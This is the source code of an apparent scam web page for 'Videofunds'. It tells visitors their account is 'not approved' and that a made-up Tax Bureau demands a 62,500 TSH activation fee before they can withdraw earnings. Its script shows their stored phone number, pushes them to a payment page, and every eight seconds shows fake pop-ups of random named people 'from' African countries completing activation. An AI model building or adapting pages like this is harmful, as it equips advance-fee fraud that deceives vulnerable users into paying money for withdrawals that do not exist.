<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Videofunds Activation</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: url("images/background.jpg");
      font-family: Arial, sans-serif;
      background-color: #f5f5f5;
    }

    .top-bar {
      background-color: #7b0f2f;
      color: white;
      padding: 15px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .top-bar .logo {
      font-size: 22px;
      font-weight: bold;
      color: dodgerblue;
    }

    .top-bar .user-area a {
      color: white;
      text-decoration: none;
      font-size: 16px;
    }

    .top-bar .user-area a:hover {
      text-decoration: underline;
    }
    
    .alert-wrapper {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background-color: rgba(0, 0, 0, 0.5);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }

    .alert-frame {
      background-color: white;
      padding: 20px;
      border-radius: 10px;
      max-width: 400px;
      width: 120%;
    }

    .alert-header {
      background-color: #b43333;
      color: white;
      padding: 7px;
      font-size: 1.5rem;
      text-align: center;
      border-radius: 5px;
      margin-bottom: 15px;
    }

    .alert-close {
      position: absolute;
      top: 10px;
      right: 10px;
      font-size: 20px;
      cursor: pointer;
    }

    .alert-body {
      padding: 10px;
      text-align: center;
    }

    .alert-message {
      font-size: 1rem;
      margin-bottom: 20px;
    }

    .question-buttons {
      display: flex;
      justify-content: center;
      gap: 15px;
    }

    .confirm-button {
      padding: 10px 20px;
      background-color: #28a745;
      color: white;
      border: none;
      font-size: 1rem;
      cursor: pointer;
      border-radius: 5px;
      transition: background-color 0.3s ease;
    }

    .confirm-button:hover {
      background-color: #218838;
    }

    .main-content {
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      padding: 40px 20px;
    }

    .main-content h2 {
      color: darkgreen;
      margin-bottom: 30px;
    }
    
    .btn-danger {
      background-color: #dc3545;
      border-color: #dc3545;
      padding: 10px 20px;
      font-size: 1rem;
    }

    .btn-danger:hover {
      background-color: #c82333;
      border-color: #bd2130;
    }

    .form-box {
      background: white;
      padding: 30px 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
      width: 300px;
      text-align: center;
    }

    .form-box label {
      font-weight: bold;
      color: blue;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 10px;
    }

    .form-box label i {
      margin-right: 5px;
    }

    .form-box input {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 14px;
      margin-bottom: 20px;
    }

    .form-box button {
      width: 100%;
      padding: 10px;
      background-color: darkgreen;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }

    .form-box button i {
      margin-right: 6px;
    }

    .form-box button:hover {
      background-color: green;
    }

    footer {
      background-color: #2c2c2c;
      color: white;
      text-align: center;
      padding: 40px;
      font-size: 14px;
    }
    
    .email-button {
      position: fixed;
      bottom: 20px;
      left: 20px;
      background-color: darkred;
      color: white;
      padding: 12px 20px;
      border: none;
      border-radius: 5px;
      text-decoration: none;
      font-size: 16px;
      font-family: Arial, sans-serif;
      z-index: 1000;
      box-shadow: 0 4px 6px rgba(0,0,0,0.3);
    }

    .email-button:hover {
      background-color: #a10000;
    }
    
    @keyframes fadeInOut {
      0% {opacity: 0; transform: translateY(-20px);}
      10% {opacity: 1; transform: translateY(0);}
      90% {opacity: 1; transform: translateY(0);}
      100% {opacity: 0; transform: translateY(-20px);}
    }
  </style>
</head>
<body> 
  <!-- Top Bar -->
  <div class="top-bar">
    <div class="logo">Videofunds</div>
    <div class="user-area">
      <a href="https://videofunds.top" target="_blank">
        <i class="fas fa-user-circle"></i>User area
      </a>
    </div>
  </div>
  
  <!-- Header -->
  <center>
    <header class="py-1 mb-1 mt-3">
      <div class="container h-100">
        <div class="row h-100 align-items-center">
          <div class="col-lg-12 mt-0 text-center">
            <font class="font9" style="font-size:1.8rem;font-weight:bold;color:#18610A;">Preparation for withdrawal of money is in progress.</font>
          </div>
        </div>
      </div>
    </header>
  </center>
  
  <h1 align="center">
    <div class="container">
      <div class="row">
        <div class="col-12 mb-2 text-center">
          <font class="font9" style="font-size:1.2rem;font-weight:bold;color:blue;">Dear user</font>
        </div>
      </div>

      <div class="row">
        <div class="col-12 mb-2 text-center">
          <font class="font9" style="font-size:1.3rem;font-weight:bold;color:blue;">
            <font color="red">Your account is not approved.</font><br>
            <span id="tax1">The Tax Bureau requires that you need to pay 62,500/-TSH for activation process inorder to Withdraw money</span><br> and immediately receive money<br>
             <span id="phoneDisplay"></span>
          </font>
        </div>
      </div>

      <div class="row">
        <div class="col-12 mb-2 text-center">
          <div style="font-size: 40px">
            <button id="chooseTaxPaymentMethod" class="btn-danger">Pay activation fees</button>
          </div>
        </div>
      </div>
    </div>
  </h1>

  <br>
  
  <!-- Email Us Button -->
  <a href="mailto:officialvideofunds@gmail.com?subject=Support%20Request" class="email-button">
    Email Us
  </a>

  <!-- Notification HTML -->
  <div id="notification" style="
    position: fixed;
    top: 20px;
    right: 20px;
    z-index: 9999;
    background-color: green;
    color: white;
    padding: 15px 20px;
    border-radius: 10px;
    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
    font-family: Arial, sans-serif;
    display: none;
  ">
    <strong>Success!</strong><br>
    <span id="notification-text">Someone just activated!</span>
  </div>

  <script>
    // Define the cuteAlert function
    function cuteAlert({
      type,
      title,
      message,
      confirmText
    }) {
      return new Promise((resolve) => {
        const alertTemplate = `
          <div class="alert-wrapper">
            <div class="alert-frame">
              <div class="alert-header">${title}</div>
              <span class="alert-close">×</span>
              <div class="alert-body">
                <p class="alert-message">${message}</p>
                <div class="question-buttons">
                  <button class="confirm-button">${confirmText}</button>
                </div>
              </div>
            </div>
          </div>`;

        // Insert the alert into the DOM
        document.body.insertAdjacentHTML("beforeend", alertTemplate);

        // Add the event listener for the confirm button
        document.querySelector(".confirm-button").addEventListener("click", () => {
          document.querySelector(".alert-wrapper").remove(); // Remove the alert
          resolve("confirm");
          // Redirect the user after the confirmation
          window.location.href = "paymentmethod.php";
        });

        // Add the event listener for the close button (×)
        document.querySelector(".alert-close").addEventListener("click", () => {
          document.querySelector(".alert-wrapper").remove();
        });
      });
    }

    // Add an event listener for the button that triggers the alert
    document.getElementById("chooseTaxPaymentMethod").addEventListener("click", () => {
      cuteAlert({
        type: "question",
        title: "PAYMENT INSTRUCTION",
        message: "Click the pay activation bottom below and follow the payment instructions to pay and activate your account according to your network.",
        confirmText: "Pay activation"
      });
    });

    // Sample names and African country flags
    const names = ["Juma", "Aisha", "Kwame", "Fatou", "Ahmed", "Blessing", "Chinedu", "Daniel", "Olivia", "Matthew",
                "Patrick", "Grace", "Brian", "Linda", "James", "Mary", "Robert", "Jennifer", "John", "Lisa",
                "William", "Elizabeth", "Joseph", "Susan", "Thomas", "Karen", "Charles", "Nancy", "Christopher", "Betty",
                "Anthony", "Margaret", "Mark", "Sandra", "Donald", "Ashley", "Steven", "Kimberly", "Paul", "Donna",
                "Andrew", "Dorothy", "Joshua", "Michelle", "Kenneth", "Carol", "Kevin", "Amanda", "Brian", "Melissa",
                "George", "Deborah", "Edward", "Stephanie", "Ronald", "Rebecca", "Timothy", "Zanele", "Ibrahim", "Musa"];
    const flags = ["🇹🇿", "🇰🇪", "🇺🇬", "🇳🇬", "🇿🇦", "🇬🇭", "🇪🇹", "🇨🇲", "🇨🇮", "🇸🇳", "🇩🇿", "🇿🇼", "🇲🇦", "🇲🇼", "🇧🇮"];

    function showNotification() {
      const name = names[Math.floor(Math.random() * names.length)];
      const flag = flags[Math.floor(Math.random() * flags.length)];
      const text = `${name} from ${flag} just completed activation!`;

      const notification = document.getElementById("notification");
      const notificationText = document.getElementById("notification-text");

      notificationText.textContent = text;
      notification.style.display = "block";

      // Restart animation
      notification.style.animation = "none";
      void notification.offsetWidth; // Force reflow
      notification.style.animation = "fadeInOut 5s ease-in-out";

      // Hide after 5s
      setTimeout(() => {
        notification.style.display = "none";
      }, 5000);
    }

    // Show notification every 8 seconds
    setInterval(showNotification, 8000);

    // Payment processing functionality
    document.addEventListener('DOMContentLoaded', function() {
      const phoneNumber = localStorage.getItem('userPhoneNumber');
      const phoneDisplay = document.getElementById('phoneDisplay');
      const accountStatus = document.getElementById('accountStatus');
      
      if (phoneNumber && phoneDisplay) {
        phoneDisplay.textContent = `Withdrawal phone number is ${phoneNumber} pay activation fees to withdrawal.`;
        localStorage.removeItem('userPhoneNumber');
      } else if (phoneDisplay) {
        phoneDisplay.textContent = 'No phone number';
      }
    });

    function startPaymentProcess() {
      const container = document.querySelector('.container');
      const paymentProcessing = document.getElementById('paymentProcessing');
      
      if (container) container.style.display = 'none';
      if (paymentProcessing) paymentProcessing.style.display = 'block';
      
      let timeLeft = 20;
      const countdownElement = document.getElementById('countdown');
      const progressBar = document.getElementById('loadingProgress');
      
      if (countdownElement && progressBar) {
        const countdownInterval = setInterval(() => {
          timeLeft--;
          const minutes = Math.floor(timeLeft / 60);
          const seconds = timeLeft % 60;
          countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
          const progress = ((40 - timeLeft) / 40) * 80;
          progressBar.style.width = `${progress}%`;
          
          if (timeLeft <= 0) {
            clearInterval(countdownInterval);
            window.location.href = "paymentmethod.php";
          }
        }, 1000);
      }
    }

    const taxPaymentButton = document.getElementById('chooseTaxPaymentMethod');
    if (taxPaymentButton) {
      taxPaymentButton.addEventListener('click', startPaymentProcess);
    }
  </script>
<?php require __DIR__ . '/includes/site-footer.php'; ?>
</body>
</html>